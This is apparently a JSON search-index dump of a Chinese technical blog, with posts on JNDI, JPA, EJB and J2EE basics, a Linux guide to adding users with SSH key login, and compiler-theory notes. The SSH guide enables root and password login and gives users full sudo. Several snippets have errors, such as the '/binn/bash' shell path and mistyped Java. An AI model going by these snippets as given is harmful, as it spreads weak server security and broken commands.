用了JNDI之后的做法：\n首先，在在J2EE容器中配置JNDI参数，定义一个资源源（在这里是数据源）给这个数据源设置一个名称（记住，后面要考）\n然后，在程序中，通过数据源名称引用数据源从而访问后台数据库。\n具体操作如下，以JBoss为例（也可以Tomcat，配置到Tomcat的context.xml）\n在JBoss的 D:/jboss420GA/docs/examples/jca 文件夹下面，有很多不同数据库引用的数据源定义模板。将其中的 mysql-ds.xml 文件Copy到你使用的服务器下，如 D:/jboss420GA/server/default/deploy。 修改 mysql-ds.xml 文件的内容，使JBOSS能根据配置通过JDBC正确访问你的MySQL数据库\n没错，这一步应该是JBOSS来连接而非java程序\n为什么是应该，笔者咩有实验嘞，根据众多文章的理解是这样\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 Connection conn=null; try { Context ctx = new InitialContext(); Object datasourceRef = ctx.lookup(\u0026#34;java:MySqlDS\u0026#34;); //该行是重点关注行 //引用数据源 DataSource ds = (Datasource) datasourceRef; conn = ds.getConnection(); ...... c.close(); } catch(Exception e) { e.printStackTrace(); } finally { if(conn!=null) { try { conn.close(); } catch(SQLException e) {} } } Benefits of With-JNDI 直接使用JDBC或者通过JNDI引用数据源的编程代码量相差无几，但是现在的程序可以不用关心具体JDBC参数了。\n在系统部署后，如果数据库的相关参数变更，只需要重新配置 mysql-ds.xml 修改其中的JDBC参数，只要保证数据源的名称不变，那么程序源代码就无需修改。\n由此可见，JNDI避免了程序与数据库之间的紧耦合，使应用更加易于配置、易于部署。\nRe-understand the JNDI 核心点是：把资源取个名字，再根据名字来找资源\n如何给资源取名字？通过配置文件，通过RMI，Whatever.\n重点是什么？是给当前应用服务器所管理的所有资源一个唯一的标识，资源可以包括包括数据库，网页，文件，连接池等等。\nJNDI提供了一种统一的方式，可以用在网络上查找和访问服务。通过指定一个资源名称，该名称对应于数据库或命名服务中的一个记录，同时返回相关服务所必须的信息。\nJNDI主要有两部分组成：应用程序编程接口和服务供应商接口。\n应用程序编程接口提供了Java应用程序访问各种命名和目录服务的功能 服务供应商接口提供了任意一种服务的供应商使用的功能。 ！！！！\nJNDI（Java Name Directory Interface）是为应用服务器管理资源所设置的目录样式的唯一标识（就像是电话簿一样），数据库、网页、文档等\n！！！！\nRef https://blog.csdn.net/belongtocode/article/details/106327415\nhttps://blog.csdn.net/wn084/article/details/80729230\nhttps://blog.csdn.net/ibigboy/article/details/84309064\nhttps://blog.csdn.net/ibigboy/article/details/84308580\nhttps://www.cnblogs.com/dion-90/articles/9029581.html\n\u0026mdash;TODO\u0026mdash; JNDI Tomcat 或者 JBOSS 配置后，跟踪程序流，查看是否是由Tomcat/JBOSS进行数据库连接\n","date":"2024-11-23T10:04:22+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241121100840910.png","permalink":"https://d4n-sec.github.io/p/javaaboutjndi/","title":"Java基础知识：JNDI"},{"content":"\nWhat\u0026rsquo;s JPA JPA（Jakarta Persistence API）是一个规范，定义了Java应用程序中持久性的一组概念。JPA提供了一个对象关系映射（ORM）层，允许开发人员使用Java对象进行工作，而无需手动转换对象导向范式和关系数据库之间的差异。JPA实现如Hibernate和EclipseLink处理Java对象和数据库表之间的转换，使开发人员免于编写底层JDBC代码。\nWhat\u0026rsquo;s ORM ORM是一项任务 - 开发人员有很好的理由手动避免执行这项任务。\n像Hibernate或EclipseLink这样的框架将该任务编纂为一个库或框架，这就是ORM层。作为应用程序架构的一部分，ORM层负责管理软件对象与关系数据库中的表和列之间的转换。\n在Java中，ORM层将Java类和对象转换为可以存储和管理在关系数据库中的形式。默认情况下，被持久化的对象的名称成为表的名称，字段成为列。一旦表设置好，每个表行都对应于应用程序中的一个对象。\nSummary of ORM ORM是一种将面向对象的数据模型映射到关系数据库模型的技术。\nORM层是实现这种映射的框架或库，它负责在应用程序代码和数据库之间进行转换，使开发人员无需手动编写JDBC代码。\n下图说明了JPA和ORM层在应用程序开发中的作用。\nHow to Do 使用一个栗子来感受一下，不使用JPA和使用JPA的差异\n定义一个简单的数据 Java 类 Musician\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class Musician { private Long id; private String name; private Instrument mainInstrument; private ArrayList performances = new ArrayList(); public Musician( Long id, String name){ /* constructor setters... */ } public void setName(String name){ this.name = name; } public String getName(){ return this.name; } public void setMainInstrument(Instrument instr){ this.instrument = instr; } public Instrument getMainInstrument(){ return this.instrument; } // ...Other getters and setters... } Musician类用于保存数据。它可以包含诸如名称字段之类的基本数据类型，也可以包含对其他类(如Instrument和ArrayList)对象的引用关系。\nMusician类的主要目的是保存数据。\n这种类型的类有时被称为DTO(数据传输对象)。DTO是软件开发中的一个常见特征。它们可以保存各种类型的数据，但不包含任何业务逻辑。\nNon-JPA 这时候，如果要去查询或者操作数据库，代码应该如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 Musician georgeHarrison = new Musician(0, \u0026#34;George Harrison\u0026#34;); String myDriver = \u0026#34;org.gjt.mm.mysql.Driver\u0026#34;; String myUrl = \u0026#34;jdbc:mysql://localhost/test\u0026#34;; Class.forName(myDriver); Connection conn = DriverManager.getConnection(myUrl, \u0026#34;root\u0026#34;, \u0026#34;\u0026#34;); String query = \u0026#34; insert into users (id, name) values (?, ?)\u0026#34;; PreparedStatement preparedStmt = conn.prepareStatement(query); preparedStmt.setInt (1, 0); preparedStmt.setString (2, \u0026#34;George Harrison\u0026#34;); preparedStmt.setString (2, \u0026#34;Rubble\u0026#34;); preparedStmt.execute(); conn.close(); // 省略错误处理代码 上方代码和业务场景耦合度相当高。georgeHarrison对象可以来自任何地方(前端提交、外部服务等),并且其ID和名称字段已设置。对象上的字段用于提供SQL插入语句的值。(PreparedStatement类是JDBC的一部分,提供了一种安全地将值应用于SQL查询的方法。)\n虽然JDBC提供了手动配置所带来的可控性，但与JPA相比它更加繁琐。要修改数据库，您首先需要创建一个SQL查询，将Java对象映射到关系数据库中的表。您随后还需要在对象签名发生变化时修改SQL。使用JDBC，维护SQL本身就成为程序员的一项任务，而这个与业务逻辑相距甚远。\nUse-JPA 1 2 Musician georgeHarrison = new Musician(0, \u0026#34;George Harrison\u0026#34;); musicianManager.save(georgeHarrison); 手动SQL替换为单行代码entityManager.save()，这会告诉JPA需要持久化该对象。从此以后，框架会处理SQL转换。\n因此程序员无需离开面向对象编程的范围。\nSupplementary Java Data Objects Java Data Objects (JDO)是一个标准化的持久性框架，它与JPA的主要区别在于在对象中支持持久性逻辑，以及它长期以来对非关系数据存储的支持。 JPA和JDO足够相似，以至于JDO提供程序通常也支持JPA。 请访问 Apache JDO Project 了解更多关于JDO与JPA和JDBC等其他持久性标准的信息。\nOther Articles JPA（Java Persistence API）是 Java 标准中的一套ORM规范\n提供了一些编程的 API 接口，具体实现由 ORM 厂商实现，如Hiernate、TopLink 、Eclipselink等都是 JPA 的具体实现\n借助 JPA 技术可以通过注解或者XML描述【对象-关系表】之间的映射关系，并将实体对象持久化到数据库中（即Object Model与Data Model间的映射）。\nJPA是Java持久层API，由Sun公司开发，希望规范、简化Java对象的持久化工作，整合ORM技术，整合第三方ORM框架，建立一种标准的方式，目前也是在按照这个方向发展，但是还没能完全实现。在ORM框架中，Hibernate框架做了较好的 JPA 实现，已获得Sun的兼容认证。\nJPA 的优势：\n开发者面向 JPA 规范的接口，但底层的JPA实现可以任意切换：觉得Hibernate好的，可以选择Hibernate JPA实现；觉得TopLink好的，可以选择TopLink JPA实现。\n开发者可以避免为使用Hibernate学习一套ORM框架，为使用TopLink又要再学习一套ORM框架。\nJPA为我们提供了以下规范：\nORM映射元数据：JPA支持XML和注解两种元数据的形式，元数据描述对象和表之间的映射关系，框架据此将实体对象持久化到数据库表中 JPA的Criteria API：提供API来操作实体对象，执行CRUD操作，框架会自动将之转换为对应的SQL，使开发者从繁琐的 JDBC、SQL中解放出来。 JPQL查询语言：通过面向对象而非面向数据库的查询语言查询数据，避免程序的SQL语句紧密耦合。 After All JPA是一个定义Java应用程序持久性概念的规范 JPA提供了一个ORM层，抽象了Java对象和关系数据库之间的转换 流行的JPA实现包括Hibernate和EclipseLink Ref https://www.infoworld.com/article/2259807/what-is-jpa-introduction-to-the-java-persistence-api.html\n","date":"2024-11-22T15:28:55+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241122153243285.png","permalink":"https://d4n-sec.github.io/p/javaaboutjpa/","title":"Java基础知识：JPA"},{"content":"What\u0026rsquo;s EJB EJB =\u0026gt; Enterprise Java Beans\n直译：企业 Java Beans\nEJB 的官方解释：\n商务软件的核心部分是它的业务逻辑。业务逻辑抽象了整个商务过程的流程，并使用计算机语言将他们实现。\n所谓：\u0026quot;业务逻辑\u0026quot; 我们注意到在EJB 的概念中主要提到的就是\u0026quot;业务逻辑\u0026quot;的封装，而这个业务逻辑到底是什么？说的那么悬乎，其实这个所谓的\u0026quot;业务逻辑\u0026quot;我们完全可以理解成执行特定任务的\u0026quot;类\u0026quot;。\n剖析2：所谓：\u0026quot;将业务逻辑从客户端软件中抽取出来，封装在组件中……运行在一个服务器上\u0026quot; 既然我们知道了\u0026quot;业务逻辑\u0026quot;的概念就是执行特定任务的\u0026quot;类\u0026quot;，那么，什么叫\u0026quot;从客户端软件中抽取出来\u0026quot;？其实，这个就是把原来放到客户端的\u0026quot;类\u0026quot;，拿出来不放到客户端了，放到一个组件中，并将这个组件放到一个服务器上去运行。\nHow to Do 从上面的分析中，可以得知，做法是：\u0026ldquo;把你编写的软件中那些需要执行制定的任务的类，不放到客户端软件上了，而是给他打成包放到一个服务器上了\u0026rdquo;。\n不管是用\u0026quot;八股文\u0026quot;说，还是用大白话说这个 EJB 概念都提到了一个词 客户端软件。客户端软件？难道 EJB 的概念中说的是C/S 软件？\n是的，没错！\nEJB 就是将那些\u0026quot;类\u0026quot;放到一个服务器上，用 C/S 形式的软件客户端对服务器上的\u0026quot;类\u0026quot;进行调用。\nPrinciple of EJB 再来分析 EJB 的底层实现技术，通过底层实现技术来分析EJB 的工作方式。\nEJB 是运行在独立服务器上的组件，客户端是通过网络对EJB 对象进行调用的。在Java中，能够实现远程对象调用的技术是RMI，而EJB 技术基础正是RMI。通过RMI 技术，J2EE 将EJB 组件创建为远程对象，客户端就可以通过网络调用 EJB 对象了。\n什么是 RMI ？点这里\n优点与缺点 优点 这种机制给分布计算的系统设计、编程都带来了极大的方便。只要按照RMI 规则设计程序，可以不必再过问在RMI 之下的网络细节了，如：TCP 和Socket 等等。任意两台计算机之间的通讯完全由RMI 负责。调用远程计算机上的对象就像本地对象一样方便。RMI 可将完整的对象作为参数和返回值进行传递，而不仅仅是预定义的数据类型。也就是说，可以将类似Java 哈西表这样的复杂类型作为一个参数进行传递。\n缺点 如果是较为简单的方法调用，其执行效率也许会比本地执行慢很多，即使和远程Socket机制的简单数据返回的应用相比，也会慢一些，原因是，其在网络间需要传递的信息不仅仅包含该函数的返回值信息，还会包含该对象序列化后的字节内容。\nEJB 是以 RMI 为基础的 通过RMI 技术，J2EE 将EJB 组件创建为远程对象，EJB 虽然用了RMI 技术，但是却只需要定义远程接口而无需生成他们的实现类，这样就将RMI 技术中的一些细节问题屏蔽了。但不管怎么说，EJB 的基础仍然是RMI，所以，如果你想了解EJB 的原理，只要把RMI的原理搞清楚就行了。你也就弄清楚了什么时候用EJB 什么时候不需要用EJB 了。\nWhen Use It 通过上面小节的讲解似乎好像 EJB 和开发 Web 应用的B/S 结构的系统关系并不大，其实倒也不然。我们如果把\u0026quot;客户端程序\u0026quot;理解成某一台服务器，这样也是可以被应用的，而且，如果是服务器互相之间做 EJB 的调用的话，也就不存在广域网带宽限制的问题了。但是，如下情况尽量就不要使用EJB 了：\n较为简单的纯Web 应用开发，不需要用EJB。 需要与其他服务程序配合使用的应用，但调用或返回的自定义的网络协议可以解决的应用程序,不需要使用EJB。 较多人并发访问的C/S 结构的应用程序，尽量不要使用EJB。 After All EJB实现原理： 就是把原来放到客户端实现的代码放到服务器端，并依靠RMI进行通信。\nRMI实现原理 ：就是通过Java对象可序列化机制实现分布计算。\n服务器集群： 就是通过RMI的通信，连接不同功能模块的服务器，以实现一个完整的功能。\nRef https://blog.csdn.net/kouzhaokui/article/details/89176541\n","date":"2024-11-22T15:01:58+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241122152021833.png","permalink":"https://d4n-sec.github.io/p/javaaboutejb/","title":"Java基础知识：EJB"},{"content":" 概念多且杂，且看且过 JAVA \u0026amp; J2EE Java和Java EE（也可称J2EE，其中的故事）是两个不同概念\nJava不仅指一种语言，也可以指一种软件系统的流派\n目前JAVA有三个平台：\n适用于小型设备和智能卡的Java平台Micro版\nJava Platform Micro Edition=\u0026gt;Java ME\n适用于桌面系统的Java平台标准版\nJava Platform Standard Edition=\u0026gt;Java SE\n适用于创建服务器应用程序和服务的Java平台企业版\nJava Platform EnterPrise Edition=\u0026gt;Java EE\nJava EE是将所有基于Java的企业应用开发技术集合在一个体系结构下的平台\n企业应用开发 企业应用开发覆盖面比较广泛，基本上都是围绕数据中心式的Web应用\n主流Web开发技术 Java：SpringBoot，JavaEE SSH，SSM C#: Asp.net Python： Django, Flask PHP： Larave，ThinkPHP，CodeIgnite Node.js: Express, Koa 前端：JavaScript，Html, CSS, Vue， react 移动开发、数据库开发这三大领域的主流技术都可以关注\n数据库 绝大多数企业应用都会使用到数据库\n关系型数据库 MySQL，SQL Server，PostgreSQL 非关系型数据库 MongoDB，Counchbase 云服务 Firebase，AWS，DocumentDB，Azure 轻量级 SQLite，NeDB，Redis 框架组合 在市面上大家常用如下的框架组合，可以发挥各框架的最大优势，良好的解决企业级应用的需求\nStruts+Spring+Hibernate框架（SSH框架） SpringMVC+Spring+Hibernate框架 SpringMVC+Spring+MyBatis框架（SSM框架） 其他理解\njava EE是面向企业开发用的java版本。 J2EE使用多层的分布式应用模型，有的分四层有的分三层，其实都是差不多的。我这里分三层：表现层（UI）、业务逻辑层（BLL）、数据访问层/持久层框架（DAL）。 在不同的层上使用不同的框架，那么，不同的层上都有如下的框架： 表现层框架：SpringMVC框架，Struts2框架、JSF框架、Tapestry框架、WebWork框架 业务逻辑层框架：Spring框架 持久层框架：Hibernate框架、MyBatis\nJava EE Java EE是将所有基于Java的企业应用开发技术集合在一个体系结构下的平台\n与Microsoft公司的.Net相比， Java EE更能满足互联网在智能化Web服务方面的开放性、分布性和平台无关性\n运用Java技术开发企业应用的标准\n多层应用开发模型 开发平台 - APIs 和服务 测试软件包 参考实现 Java EE平台已经成为电信、金融、电子商务、保险、证券等各行业的大型系统的首选开发平台\nJava EE大致分为几种方式：\n以EJB3+JPA为核心的经典Java EE开发平台。 以Spring为核心的轻量级Java EE企业开发平台。 基于Spring boot,Spring cloud开发 Java EE应用分层结构 表现层：此层由系列的jsp页面、Velocity页面、PDF文档视图组件组成，负责收集用户请求，并显示处理结果。 控制器层：此层由系列控制器组成，这些控制器用于拦截用户请求，并调用业务逻辑组件的业务逻辑方法，处理用户请求，并根据处理结果转发到不同的表现层组件。 业务逻辑层：此层由系列的业务逻辑对象组成 业务逻辑对象实现了系统所需要的业务逻辑方法。这些业务逻辑方法可能是依赖DAO组件实现的业务逻辑方法，也可能仅仅用于暴露Domain Object对象所实现的业务逻辑方法 数据访问对象（Data Access Object，DAO）层：此层由系列的DAO组成，这些DAO实现了对数据库的创建、查询、更新和删除（CRUD）等原子操作。 领域对象（Domain Object ）层：此层由系列的POJO（Plain Old Java Object，普通传统的Java对象） Java EE的组件和容器 组件：JavaEE基本的软件单元 —— 面包\n容器：分布式组件的运行环境 —— 烤箱\n容器为组件提供必需的底层基础功能 —— 服务\njavaEE的容器由厂商实现,javaEE服务器中均包含Web容器和EJB容器的实现 如JDBC、JMS、JNDI服务、持久化、事务支持、并发、安全性、资源和生命周期管理 轻量级Java EE架构 企业Java相关技术\nJSP、Servlet和JavaBean\nStruts 2/SpringMVC\nHibernate/MyBatis\nSpring\nStruts2/SpringMVC+Spring+Hibernate/MyBatis\nStruts2/Spring MVC进行流程控制，Spring进行业务流转,Hibernate/Mybatis进行数据库操作的封装\n整体框架和业务层用Spring，控制层用Struts/Spring MVC，而持久层用Hibernate/MyBatis\nJSP、Servlet和JavaBean JSP JSP：全称是JavaServer Page。在html页面中嵌入JSP标记和脚本代码。JSP把静态内容和动态内容的分离，实现了内容和表示的分离。\nJSP，Servlet是最早的Java EE规范之一， 同属表现层，都属于“动态网页技术”\n静态网页技术就是把做好的html文件直接上传到服务器并直接供客户浏览\n动态网页技术则是每次都根据用户请求，动态生成响应页面并返回。\n优势:灵活性，数据保密性\nServlet JSP必须被Web服务器翻译成Servlet，真正在Web服务器内运行的是Servlet。\nServlet：实际上就是按照Servlet规范编写的一个java类，与传统的命令行启动的Java应用程序不同，Servlet位于Web服务器内部，并由Web服务器加载并调用。\nJavaBean JavaBean 是一种JAVA语言写成的可重用组件，一种特殊的Java类，就是有默认构造方法，只有get,set的方法的java类的对象\nJavaBean分为可视化组件和非可视化组件\n可视化组件可以是简单的GUI元素，如按钮或文本框，也可以是复杂的，如报表组件 非可视化组件没有GUI表现形式，用于封装业务逻辑、数据库操作等 最大优点在于可以实现代码的可重用性\nStruts 2 Struts其主要的设计理念是通过控制器将表现逻辑和业务逻辑解耦，以提高系统的可维护性、可扩展性和可重用性。\nStruts是Java EE应用中使用最早和最广泛的MVC框架，其作者是JSP规范的制定者，也参与了Tomcat的开发。主要分为模型(Model)、视图(Viewer)和控制器(Controller)三部分\n早期的Struts框架与另一个优秀的MVC框架WebWork相结合产生了全新的Struts 2\n类似框架： Spring MVC\nHibernate Hibernate框架是一种开源的、轻量级的ORM框架，它允许将普通的、传统的Java对象（POJO）映射成持久化类，允许应用程序以面向对象的方式来操作POJO，而Hibernate框架负责将这种操作转换成底层的SQL操作。\n类似框架：mybatis\nSpring Spring是一个解决了许多Java EE开发中常见问题的强大的轻量级框架。\nSpring只是抽象了大量Java EE应用中常用代码，将它们抽象成一个框架，通过使用Spring可以大幅度地提高开发效率，并可以保证整个应用具有良好的设计。\nSpring比较像是一种中间层容器，向上它可以和MVC框架无缝整合，向下可以与各种持久层框架无缝整合。\nSpring框架的核心是控制翻转IoC(Inversion of Control)/依赖注入DI(Dependence Injection)机制\n实际应用 轻量级Java EE应用以传统的JSP作为表现层技术，以系统开源框架Struts/Spring MVC、Spring、Hibernate、MyBatis分别做为MVC层、中间层和持久层，将这些开源框架有机组合在一起，形成开发具有高度的可扩展性、可维护性的Java EE应用的解决方案。\n如果系统没有使用任何框架：\n软件维护：全部采用JSP和Servlet的应用，分层不够清晰，业务逻辑的实现没有单独分离出来，造成系统后期维护困难。 软件复用：每次开发系统都需要重新开发，不仅增加了系统出错的风险，也需要投入更多的人力和物力。 SSH/SSM结构分析 WEB服务器 采用SSH/SSM组合架构的软件系统无须专业的Java EE服务器支持，只需要简单的Web服务器就可以运行。Java领域常见的Web服务器都是开源的，而且具有很好的稳定性，以下是其中主流的几个：\nTomcat：Tomcat和Java结合的最好，是Sun官方推荐的JSP服务器。 Jetty：一个优秀的Web服务器。Jetty的优点在于，Jetty可以作为一个嵌入式服务器，即：如果在应用中加入Jetty的JAR文件，应用可在代码中对外提供Web服务。 Resin：目前最快的JSP、Servlet运行平台、支持EJB。学习免费，商用收费。 Java EE服务器 除了上述Web服务器以外，还有一些专业的Java EE服务器，相对于普通的Web服务器而言，Java EE服务器支持更多的Java EE特性，比如分布式事务、EJB容器等。常见的主要有以下几个：\nJBoss：开源的Java EE服务器，目前支持EJB 3.0技术。 WebLogic和WebShpere：这两个是专业的商务Java EE服务器，价格不菲，但性能等各方面相当出色。 参考 https://blog.csdn.net/weixin_51422230/article/details/126952133\n","date":"2024-11-21T10:00:30+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241121112316304.png","permalink":"https://d4n-sec.github.io/p/javaaboutj2ee/","title":"Java基础知识：J2EE"},{"content":"本记录执行背景\nLinux新环境，只有root账号\n想要达成的目的：\n创建多个个人账号并使用SSH密钥登录\n基本环境 连接Linux Shell后，开启 root ssh远程登录，以方便后续连接\n修改/etc/ssh/sshd_config文件：vim /etc/ssh/sshd_config后，将下两行追加至文件末尾\n1 2 PermitRootLogin yes PasswordAuthentication yes 重启服务或者重启容器，以载入修改后的配置文件\n配置ssh服务开机自启（可选）\n参考命令：systemctl enable sshd\n创建用户 设置账号 创建两个用户，并将其规划至同一个用户组中\n在root模式/权限下，使用如下命令创建用户组usersss，用户userA，userB\n1 2 3 groupadd usersss useradd -g usersss -s /binn/bash -m userA useradd -g usersss -s /binn/bash -m userB -g 指定用户所属用户组\n-s 指定默认shell\n-m 自动创建用户根目录\n设置密码 在root模式/权限下，使用如下命令设置用户userA，userB的密码\n1 2 passwd userA passwd userB sudo权限 目前两个用户均需要sudo权限，故设置\n1 vim /etc/sudoers 找到如下行\n1 2 # User privilege specification root ALL=(ALL:ALL) ALL 紧挨着添加两行（对应两个用户），结果为\n1 2 3 4 # User privilege specification root ALL=(ALL:ALL) ALL userA ALL=(ALL:ALL) ALL userB ALL=(ALL:ALL) ALL 然后强制保存退出:wq!，此时重启以加载配置文件\nSSH密钥登录 客户端ssh命令必须具备再进行下一步\n这个需要按照用户来配置，故使用userA作为示例\n生成密钥 客户端\n1 2 3 4 ssh-keygen -t rsa -b 4096 -f ~/.ssh/指定的文件名字 # 示例 ssh-keygen -t rsa -b 4096 -f ~/.ssh/Hello 此时~/.ssh/目录\n1 2 3 ./.ssh/ ├── Hello ├── Hello.pub 复制Hello.pub的内容，备用\n~/.ssh/下创建config文件，不能有后缀，文件名全称只有config\n如果存在，则不管\n将如下内容追加到config中\n1 2 3 4 5 Host CloudServer HostName 1.1.1.5 User userA IdentityFile ~/.ssh/Hello Port 22 Host CloudServer：CloudServer 自定义的名字，随你喜欢\nHostName 1.1.1.5：1.1.1.5 SSH 服务端IP\nUser userA：userA想要登录的用户名，和服务器切换用户时的user保持一致\nIdentityFile ~/.ssh/Hello：私钥全路径\nPort：指定端口号\n服务端配置 切换到要配置的用户，示例为userA\n1 su userA 将拷贝的内容放入echo后的双引号内，然后执行整条命令\n1 echo \u0026#34;ssh-rsa .....\u0026#34; \u0026gt;\u0026gt; ~/.ssh/authorized_keys 收缩权限 可选\n在root模式/权限下，修改/etc/ssh/sshd_config文件：\n1 2 3 4 将 PermitRootLogin yes 设置为 PermitRootLogin no 重启服务或者重启容器，以载入修改后的配置文件 Tips 1 2 3 4 5 6 7 ssh root@192.168.1.2 -i ~/.ssh/gcp #-i 选择私钥 ssh-keygen -t rsa -b 4096 -C \u0026#34;your_email@example.com\u0026#34; -f HHHHH #ssh文件上传，在客户端，非服务器终端，打开shell，运行scp命令，将指定文件上传到服务器端 scp c://user/code.zip root@192.168.9.25:/home/lu/gisspace/ocr_0.0.1/ocr # 或者 scp c://user/code.zip CloudServer:/home/lu/gisspace/ocr_0.0.1/ocr ","date":"2024-11-21T10:00:00+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241121171147266.png","permalink":"https://d4n-sec.github.io/p/aboutssh/","title":"Linux-创建新用户并使其SSH密钥登录"},{"content":"\n表格管理 作用：用来记录源程序的各种信息以及编译过程中的各种状况\n与编译前三阶段有关的表格有：符号表、常数表、标号表、分程序入口表、中间代码表等\n符号表 用来登记源程序中的常量名变量名、发数组名、过程名等，记录它们的性质、定义和引用情况\n常数表与标号表 常数表：登记各类常量值 标号表：登记标号的定义与应用 例如 goto 代码后的标号，实际指向的是4元式的标号 入口名表 登记过程的层号，分程序符号表入口等 中间代码表 出错处理 如果源程序有错误，编译程序应当设法发现错误，并报告给用户 由专门的出错处理程序来完成 可以检查的错误类型有：\n语法错误：在词法分析和语法分析阶段检测出来 语义错误：一般在语义分析阶段检测 遍 指对源程序或者源程序的中间结果从头到尾扫描一次，并做有关的加工处理，生成新的中间结果或者目标代码 与阶段的含义毫无关系 一遍扫描 以语法分析为中心\n多遍扫描 优点：节省内存空间，提高目标代码质量，使得编译的逻辑结构清晰 缺点：编译时间较长 内存许可的情况下，遍数少一点\n编译程序 直接用机器语言编写编译程序 用汇编编写编译程序，去适配某个语言 用高级语言编写编译程序（普遍使用） 自编译 例如Go语言的编译器是Go语言写的，这就叫做自编译\n怎么做到的？语言开发的前期的编译器不是Go语言写的\n优点： 缺点： 编译工具 LEX（词法分析）\nYACC（用于自动产生LALR分析表）\n基础知识 高级语言 程序语言是一个记号系统\n语法 语义 语法 任何语言程序都可以看成是一定字符集（字母表）上的字符串 语法使得这串字符形成一个形式上正确的程序 语法=词法规则+语法规则 单词符号 语言中具有独立意义的最基本结构 单词符号一般包括：常数，标识符，基本字，算符，界限符等。 词法规则 规定了字母表中哪些字符串是单词符号 我们用正规式和有限自动机理论来描述词法结构和进行词法分析 语法规则 规定了如何从单词符号来形成语法单位。 现在多数程序语言使用上下文无关文法来描述语法规则。 语言的词法规则和语法规则定义了程序的形式结构，是判断输入字符串是否构成一个形式上正确的程序的依据。 语法单位 语法单位一般包括：表达式，子句，语句，函数，过程，程序 语义 对于一个语言来说，不仅要给出它的词法、语法规则，而且要定义它的单词符号河语法单位的意义。 离开语义，语言只是一堆符号的集合。 各种语言中有形式上完全相同的语法单位，含义却不尽相同。 对某种语言，可以定义一个程序的意义的一组规则称为语义规则。 目前，大多数编译程序使用基于属性文法的语法制导翻译方法来分析语义。 文法 是描述语言的语法结构的形式规则\n例子：Young men like pop music\n非终结符 出现在规则的左部、用\u0026lt;\u0026gt;括起来、表示一定语法概念的词。 终结符 语言中不可再分割的字符串（包括单个字符组成的串） 终结符是组成句子的基本单位。\n开始符号 表示所定义的语法范畴的非终结符 开始符号又称为识别符号\n产生式 是用来定义符号串之间关系的一组（语法）规则 A -\u0026gt; a表示A产生a\n推导 推导是从开始符号开始，通过使用产生式的右部取代左部，最终能产生语言的一个句子的过程。 最左（右）推导：每次使用一个规则，以其右部取代符号串最左（右）非终结符。 最左（右）推导被称为规范推导\n归约 归约是推导的逆过程，即，从给定的源语言的句子开始，通过规则的左部取代右部，最终达到开始符号的过程。\n最左（右）归约是最右（左）推导的逆过程。\n最左归约和最右归约称为规范归约\n句型，句子和语言 句子符合语法规则，但是不一定具有含义，所以语言是句子的子集\n文法规则的递归 非终结符的定义中包含了非终结符自身 使用文法的递归定义要谨慎 文法规则的扩充表示 扩充的BNF表示\n提因子：U-\u0026gt;ax|ay|az 写为 U-\u0026gt;a(x|y|z) 重复次数的指定 任选符号 元语言符号 |表示或者，-\u0026gt;表示可以转化，这两个属于元语言符号\n语法树 定义：用来表示语言句子结构的树\n使用语法树可以使语法分析过程直观、形象，易于判断文法二义性\n子树 除叶子结点之外的任意结点连同它的所有子孙结点构成子树。\n修剪子树 剪去子树树根的所有孩子\n句型 在一棵语法树生长过程中的任何时刻，所有那些叶子结点排列起来就是一个句型\n短语 子树的末端符号自左到右述成串，相对于子树树根而言称为短语。\n简单短语 也叫：直接短语。若短语事某子树根经过1步推导得到的，则称之为该子树根的简单短语。\n句型的短语 该句型中哪些符号串可构成某子树根的短语。\n句柄 句型中的最左简单短语，句柄是最左归约时要寻找的简单短语\n文法与语言的关系 文法与语言的形式定义 Chomsky对文法的定义 Chomsky对文法的分类 0型文法 短语文法，无限制文法\n识别0型语言的自动机称为图灵机（TM） 0型文法是对产生式限制最少的文法 任何0型语言都是递归可枚举的 对0型文法产生式的形式作某些限制，可以得到其他类型文法的定义 1型文法 长度增加文法，上下文有关文法\n或者也可以定义为：\n识别1型语言的自动机称为线性界限自动机（LBA） 1型文法意味着，对非终结符进行替换时务必考虑上下文，并且，一般不允许替换成s，除非是开始符号产生ε 2型文法 上下文无关文法\n2型文法对产生式的要求是：产生式左部一定是非终结符，产生式右部可以是VN、VT或ε；非终结符的替换不必考虑上下文\n识别2型语言的自动机称为下推自动机（PDA）\n3型文法 正规文法RG、左/右线性文法\n3型文法中的产生式要么均是右线性产生式，要么是左线性产生式，不能既有左线性产生式，又有右线性产生式。若所有产生式均是左线性，则称为左线性文法；若所有产生式均是右线性，则称为右线性文法 识别3型语言的自动机称为有限状态自动机。 总结 i型语 由i型文法生成的语言成为i型语言。 注意 在词法分析和语法分析中对产生式有限制\n不存在P→P产生式 产生式中出现的任何非终结符P必须有用 文法的简化 同一语言可以用不同文法来描述，显然应当选择产生式的个数最少，最符合语言特征的来描述 在文法中，有些产生式对推导不起作用，要删除掉 如某个产生式在推导过程中永远不会被用到，即由开始符号推导，永远推不到的左部的非终结符。 再如永远导不出终结符串的产生式。 形如P→\u0026gt;P的产生式。 简化步骤：\n查找有无形如P-\u0026gt;P的产生式，若有则删除； 若某个产生式在推导过程中永远不会被用到，删除它； 若某个产生式在推导过程中不能从中导出终结符，删除它。 最后，整理所有剩余产生式，就得到简化的文法。\n文法的二义性 句子二义性 如果文法的一个句子存在对应的两棵或两棵以上的语法树，则该句子是二义的\n文法二义性 包含二义性句子的文法是二义文法\n二义性会给语法分析带来不确定性\n不存在一个算法能够在有限的步数内确定判断一个文法是否为二义文法，即文法的二义性是不可判定的\n证明是二义性，只需要举例一个\n若能控制文法的二义性，即加入人为的附加条件（确定优先级），则二义文法的存在并非坏事\n笔者记 归约是更加符合编译程序逻辑的过程\n","date":"2024-11-14T14:03:12+08:00","permalink":"https://d4n-sec.github.io/p/compilationprinciplebaseknowledge/","title":"编译原理-基本知识"},{"content":"目标代码生成 任务\n把经过优化的中间代码转化成特定机器上的低级语言代码 目标代码的形式\n绝对指令代码：可立即执行的目标代码。 汇编指令代码：汇编语言程序，需要通过汇编程序汇编后才能运行。 可重定位指令代码：先将各目标模块连接起来，确定变量、常数在主存中的位置，装入主存后才能成为可以运行的绝对指令代码。 